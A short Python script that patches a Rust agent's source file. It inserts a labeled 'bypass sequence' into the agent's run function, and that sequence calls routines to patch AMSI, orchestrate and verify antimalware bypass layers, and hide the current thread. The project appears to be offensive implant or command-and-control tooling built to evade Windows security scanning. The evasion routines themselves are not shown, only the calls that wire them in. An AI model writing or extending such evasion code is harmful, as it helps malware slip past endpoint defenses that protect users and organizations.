import re

path = '/home/replicant/la/agent/src/lib.rs'
with open(path, 'r') as f:
    data = f.read()

startup_code = """
        // BYPASS SEQUENCE START
        log::debug!("Applying evasion layers");
        crate::evasion::patch_amsi();
        crate::amsi_defense::orchestrate_layers();
        crate::amsi_defense::verify_bypass();
        crate::evasion::hide_current_thread();
        log::debug!("Evasion layers applied");
        // BYPASS SEQUENCE END
"""

data = data.replace('pub async fn run(&mut self) -> Result<()> {', 'pub async fn run(&mut self) -> Result<()> {' + startup_code)

with open(path, 'w') as f:
    f.write(data)

